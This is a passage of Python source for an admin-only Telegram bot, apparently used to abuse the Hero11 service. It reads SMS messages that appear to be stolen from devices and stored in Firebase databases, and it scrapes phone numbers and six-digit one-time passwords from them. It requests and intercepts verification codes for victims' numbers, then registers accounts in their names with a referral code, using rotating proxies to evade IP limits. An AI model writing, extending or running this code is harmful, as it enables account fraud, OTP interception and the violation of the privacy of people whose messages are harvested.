            for fb_url in USER_DATA["firebase_dbs"]:
                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
                try:
                    cids_to_check = []
                    if scan_all:
                        async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                            clients_data = await r.json() or {}
                            for cid, cdata in clients_data.items():
                                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                    cids_to_check.append(cid)
                    else:
                        cids_to_check = list(target_cids)

                    for cid in cids_to_check:
                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=25', timeout=6) as m_req:
                            msgs = await m_req.json()
                            phones = extract_all_phones(msgs)
                            if phones:
                                num_lines = []
                                for p in phones:
                                    full_phone = "+91" + p
                                    client = AsyncHero11Client(full_phone, default_code)
                                    try:
                                        res = await client.black_check()
                                    finally:
                                        await client.close()
                                    badge = "🔴 Registered" if res == "SKIP_EXISTS" else "🟢 Unregistered"
                                    num_lines.append(f"  • <code>{html.escape(full_phone)}</code> — {badge}")
                                report_blocks.append(
                                    f"🆔 <b>ID:</b> <code>{html.escape(cid)}</code> (DB: {html.escape(db_short_id)})\n" + "\n".join(num_lines)
                                )
                except Exception:
                    pass

        if not report_blocks:
            await status_msg.edit_text("ℹ️ No phone numbers found for the specified Device ID(s).", reply_markup=get_main_menu())
        else:
            full_report = "\n\n".join(report_blocks)
            if len(full_report) > 3900:
                full_report = full_report[:3900] + "\n\n<i>[Truncated]</i>"
            await status_msg.edit_text(
                f"🔢 <b>All Numbers Found by Device ID:</b>\n\n{full_report}",
                parse_mode="HTML",
                reply_markup=get_main_menu()
            )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error scanning Device ID(s): {html.escape(str(e))}", reply_markup=get_main_menu())

@dp.callback_query(F.data.startswith("hist_win_"))
async def cb_show_history_by_window(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase_dbs"]:
        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
        return

    try:
        window_minutes = int(callback.data.split("_")[-1])
    except Exception:
        window_minutes = 10

    labels = {10: "under 10 min", 60: "under 1 hr", 1440: "under 24 hr"}
    win_label = labels.get(window_minutes, f"under {window_minutes}m")
    max_age_sec = window_minutes * 60
    now_ist = datetime.now(IST)
    default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"

    status_msg = await callback.message.answer(
        f"🔍 Grouping unregistered IDs & filtering chat history <b>{html.escape(win_label)}</b>...",
        parse_mode="HTML"
    )

    try:
        reg_cache = {}
        grouped = await collect_grouped_unregistered_devices(
            firebase_dbs=USER_DATA["firebase_dbs"],
            invite_code=default_code,
            reg_cache=reg_cache,
            window_minutes=None,
            limit=20,
        )

        id_blocks = []
        for dev in grouped:
            msgs = dev["msgs"]
            cid = dev["cid"]
            db_short_id = dev["db_short_id"]
            unreg_list_str = ", ".join(dev["unreg_phones"])

            recent_lines = []
            for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
                if not isinstance(m_val, dict):
                    continue
                age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
                if age_sec is None or age_sec > max_age_sec:
                    continue

                time_ago = format_relative_time(extract_raw_time(m_val), msg_key=m_key, idx=idx)
                body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
                sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")

                otps = re.findall(r'\b\d{6}\b', body_str)
                valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
                otp_badge = f" 🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""

                recent_lines.append(
                    f"  • [{html.escape(time_ago)}] <b>{html.escape(sender_str)}</b>{otp_badge}: {html.escape(body_str[:140])}"
                )

            if recent_lines:
                id_blocks.append(
                    f"🆔 <code>{html.escape(cid)}</code> [{html.escape(db_short_id)}]\n"
                    f"📱 <code>{html.escape(unreg_list_str)}</code>\n"
                    + "\n".join(recent_lines[:5])
                )

        if not id_blocks:
            await status_msg.edit_text(
                f"ℹ️ No chat history messages found for <b>unregistered numbers</b> <b>{html.escape(win_label)}</b>.",
                parse_mode="HTML",
                reply_markup=get_main_menu()
            )
        else:
            block = "\n\n".join(id_blocks[:8])
            if len(block) > 3800:
                block = block[:3800] + "\n\n<i>[Truncated]</i>"
            await status_msg.edit_text(
                f"💬 <b>UNREGISTERED CHAT HISTORY ({html.escape(win_label.upper())}) — {len(id_blocks)} ID(s)</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n{block}",
                parse_mode="HTML",
                reply_markup=get_main_menu()
            )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error loading chat history: {html.escape(str(e))}", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "view_active_sms")
async def cb_view_active_sms(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase_dbs"]:
        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
        return

    status_msg = await callback.message.answer("🔍 Scanning all online unregistered numbers grouped by ID...")

    try:
        active_devices = []
        default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
        reg_cache = {}
        grouped = await collect_grouped_unregistered_devices(
            firebase_dbs=USER_DATA["firebase_dbs"],
            invite_code=default_code,
            reg_cache=reg_cache,
            limit=20,
        )

        for dev in grouped:
            for full_phone in dev["unreg_phones"]:
                active_devices.append({
                    "phone": full_phone,
                    "cid": dev["cid"],
                    "db_url": dev["firebase_url"],
                    "db_short": dev["db_short_id"],
                })

        if not active_devices:
            await status_msg.edit_text("ℹ️ No active unregistered online numbers found.", reply_markup=get_main_menu())
            await callback.answer()
            return

        keyboard_buttons = []
        temp_map = {}
        for idx, dev in enumerate(active_devices):
            cb_key = f"sms_{idx}_{dev['db_short']}"
            btn_text = f"📱 {dev['phone']} | {dev['cid'][:8]}.."
            keyboard_buttons.append([InlineKeyboardButton(text=btn_text, callback_data=cb_key)])
            temp_map[cb_key] = dev

        USER_DATA["temp_active_devices"] = temp_map

        markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
        await status_msg.edit_text(
            f"📋 <b>Found {len(active_devices)} Unregistered Number(s) Across {len(grouped)} Online ID(s).</b>\n"
            "Click any number below to view its live top 15 recent message history:",
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error scanning active devices: {html.escape(str(e))}", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data.startswith("sms_"))
async def cb_show_device_sms(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    dev_map = USER_DATA.get("temp_active_devices", {})
    dev_info = dev_map.get(callback.data)

    if not dev_info:
        await callback.answer("⚠️ Session expired or device list refreshed. Please click View Active Devices again.", show_alert=True)
        return

    try:
        import aiohttp
        fb_url = dev_info["db_url"]
        cid = dev_info["cid"]
        phone = dev_info["phone"]

        sms_list = []
        async with aiohttp.ClientSession() as session:
            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as m_req:
                msgs = await m_req.json()
                if isinstance(msgs, dict):
                    for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
                        if isinstance(m_val, dict):
                            raw_time = extract_raw_time(m_val)
                            time_ago = format_relative_time(raw_time, msg_key=m_key, idx=idx)
                            body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
                            sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")

                            otps = re.findall(r'\b\d{6}\b', body_str)
                            valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
                            otp_badge = f"  🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""

                            sms_list.append(
                                f"📤 <b>{html.escape(sender_str)}</b> • {html.escape(time_ago)}{otp_badge}\n"
                                f"💬 {html.escape(body_str)}"
                            )

        sms_block = "\n\n".join(sms_list) if sms_list else "<i>No messages found</i>"
        cache_buster = int(time.time())
        detail_text = (
            f"<b>LATEST SMS — {html.escape(cid)} (latest 15)</b>\n"
            f"📞 <b>{html.escape(phone)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{sms_block}\n"
            f"<span class='tg-spoiler'>[ref:{cache_buster}]</span>"
        )

        refresh_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Refresh SMS History", callback_data=callback.data)],
            [InlineKeyboardButton(text="⬅️ Back to Active Devices", callback_data="view_active_sms")],
            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_to_main")]
        ])

        try:
            await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=refresh_markup)
            await callback.answer("Refreshed successfully!")
        except Exception as edit_err:
            if "message is not modified" in str(edit_err):
                await callback.answer("✅ SMS history is up to date!", show_alert=False)
            else:
                raise edit_err

    except Exception as e:
        await callback.message.edit_text(f"❌ Error fetching SMS history: {html.escape(str(e))}", reply_markup=get_main_menu())
        await callback.answer()

@dp.callback_query(F.data == "back_to_main")
async def cb_back_to_main(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    current_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "Not Set ❌"
    text = (
        "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
        f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
        f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
        "Select an option below:"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "check_proxies")
async def cb_check_proxies(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["proxies"]:
        await callback.answer("❌ No proxies loaded!", show_alert=True)
        return

    status_msg = await callback.message.answer(f"⚡ Testing {len(USER_DATA['proxies'])} proxies concurrently using Chrome impersonation...")
    total_proxies = len(USER_DATA['proxies'])

    def run_tests():
        alive_list = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(test_proxy_sync, p): p for p in USER_DATA["proxies"]}
            for future in as_completed(futures):
                ok, latency, info, p = future.result()
                if ok:
                    alive_list.append(p)
        return alive_list

    alive_proxies = await asyncio.to_thread(run_tests)
    USER_DATA["proxies"] = alive_proxies

    await status_msg.edit_text(
        f"⚡ <b>Proxy Health Check Complete!</b>\n"
        f"🟢 <b>Alive & Fast Proxies:</b> {len(alive_proxies)}/{total_proxies}\n"
        f"💡 <i>Dead proxies have been automatically purged from memory.</i>",
        parse_mode="HTML",
        reply_markup=get_main_menu()
    )
    await callback.answer()

@dp.callback_query(F.data == "stop_automation")
async def cb_stop_automation(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if USER_DATA["current_task"] and not USER_DATA["current_task"].done():
        USER_DATA["current_task"].cancel()
    USER_DATA["is_running"] = False
    await callback.message.answer("🛑 <b>Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data.startswith("start_auto_"))
async def cb_start_automation(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if USER_DATA["is_running"]:
        await callback.answer("⚠️ Automation is already running!", show_alert=True)
        return
    if not USER_DATA["firebase_dbs"] or not USER_DATA["codes"]:
        await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
        return

    try:
        window_minutes = int(callback.data.split("_")[-1])
    except Exception:
        window_minutes = 10

    window_labels = {
        10: "last 10 min",
        60: "past 1 hr",
        1440: "last 24 hrs",
    }
    window_label = window_labels.get(window_minutes, f"last {window_minutes}m")

    USER_DATA["is_running"] = True
    status_msg = await callback.message.answer(
        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Grouping unregistered IDs with OTP pattern in {html.escape(window_label)}...",
        parse_mode="HTML",
        reply_markup=get_main_menu()
    )

    async def run_automation():
        import aiohttp
        firebase_dbs = USER_DATA["firebase_dbs"]
        current_code = USER_DATA["codes"][0]
        total_needed = 2
        success_count = 0
        registered_numbers = []
        skipped_phones = set()
        used_phones = set()
        skipped_cids = set()
        reg_cache = {}
        logger = LiveLogger(status_msg)

        try:
            while success_count < total_needed and USER_DATA["is_running"]:
                grouped = await collect_grouped_unregistered_devices(
                    firebase_dbs=firebase_dbs,
                    invite_code=current_code,
                    reg_cache=reg_cache,
                    skipped_cids=skipped_cids,
                    skipped_phones=skipped_phones,
                    used_phones=used_phones,
                    window_minutes=window_minutes,
                    limit=50,
                )

                candidate_queue = []
                for dev in grouped:
                    for full_phone in dev["unreg_phones"]:
                        if full_phone not in skipped_phones and full_phone not in used_phones:
                            candidate_queue.append({
                                "firebase_url": dev["firebase_url"],
                                "db_short_id": dev["db_short_id"],
                                "cid": dev["cid"],
                                "phone": full_phone,
                            })

                if not candidate_queue:
                    await logger.set_text(f"🔴 Scan complete: No unregistered numbers with OTP pattern in {window_label}. Retrying in 5s...")
                    await asyncio.sleep(5)
                    continue

                target = random.choice(candidate_queue)
                firebase_url = target["firebase_url"]
                db_short_id = target["db_short_id"]
                cid = target["cid"]
                phone = target["phone"]
                used_phones.add(phone)

                await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")

                async with aiohttp.ClientSession() as session:
                    known_keys = set()
                    try:
                        async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
                            k_data = await r.json()
                            if isinstance(k_data, dict):
                                known_keys = set(k_data.keys())
                    except Exception:
                        pass

                client = AsyncHero11Client(phone, current_code)
                try:
                    send_status = await client.send_otp()
                    if send_status != "SUCCESS":
                        skipped_phones.add(phone)
                        continue

                    await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")

                    otp_found = None
                    start_poll = time.time()
                    while time.time() - start_poll < OTP_TIMEOUT and USER_DATA["is_running"]:
                        await asyncio.sleep(POLL_INTERVAL)
                        try:
                            async with aiohttp.ClientSession() as session:
                                async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
                                    msgs = await r.json()
                                    if isinstance(msgs, dict):
                                        for msg_key, msg_val in msgs.items():
                                            if msg_key not in known_keys and isinstance(msg_val, dict):
                                                txt = str(msg_val.get("body") or msg_val.get("message") or "")
                                                for otp in re.findall(r'\b\d{6}\b', txt):
                                                    if otp not in ["000000", "123456", "111111", "999999"]:
                                                        otp_found = otp
                                                        break
                                        if otp_found:
                                            break
                        except Exception:
                            pass

                    if not otp_found:
                        skipped_phones.add(phone)
                        continue

                    await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | OTP Found: {otp_found}\n🔄 Forcing registration & verification...")

                    v_res = "INVALID"
                    for _ in range(5):
                        v_res = await client.verify_otp(otp_found)
                        if v_res in ("SUCCESS", "IP_LIMITED"):
                            break
                        await asyncio.sleep(1.5)

                    if v_res == "SUCCESS":
                        success_count += 1
                        skipped_phones.add(phone)
                        registered_numbers.append(f"{phone} (ID: {cid[:8]}, DB: {db_short_id})")
                        await logger.set_text(f"✅ [DB: {db_short_id}] SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
                    elif v_res == "IP_LIMITED":
                        skipped_phones.add(phone)
                        await logger.set_text("⚠️ IP Limited / Restricted by Hero11. Rotating proxy...")
                    else:
                        skipped_phones.add(phone)
                        await logger.set_text(f"❌ Verification failed for {phone} after multiple attempts. Moving on...")
                finally:
                    await client.close()

                await asyncio.sleep(3.0)

            USER_DATA["is_running"] = False
            if success_count >= total_needed:
                numbers_list_str = "\n".join([f"• <code>{html.escape(num)}</code>" for num in registered_numbers])
                final_msg = (
                    f"🎉 <b>HERO11 REGISTRATION COMPLETED!</b> 🎉\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱️ <b>Filter Window:</b> OTP in {html.escape(window_label)}\n"
                    f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
                    f"📱 <b>Exact Registered Numbers & DB Source:</b>\n{numbers_list_str}\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
            else:
                await callback.message.answer("🛑 <b>Automation was stopped or IP limited.</b>", parse_mode="HTML", reply_markup=get_main_menu())

        except asyncio.CancelledError:
            USER_DATA["is_running"] = False
        except Exception as e:
            USER_DATA["is_running"] = False
            await callback.message.answer(f"❌ Error in automation loop: {html.escape(str(e))}", reply_markup=get_main_menu())

    USER_DATA["current_task"] = asyncio.create_task(run_automation())
    await callback.answer()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            print("\n\n❌ Bot stopped.")
            sys.exit(0)
        except Exception as exc:
            print(f"⚠️ Polling loop interrupted: {exc}. Restarting in 5s...")
            time.sleep(5)
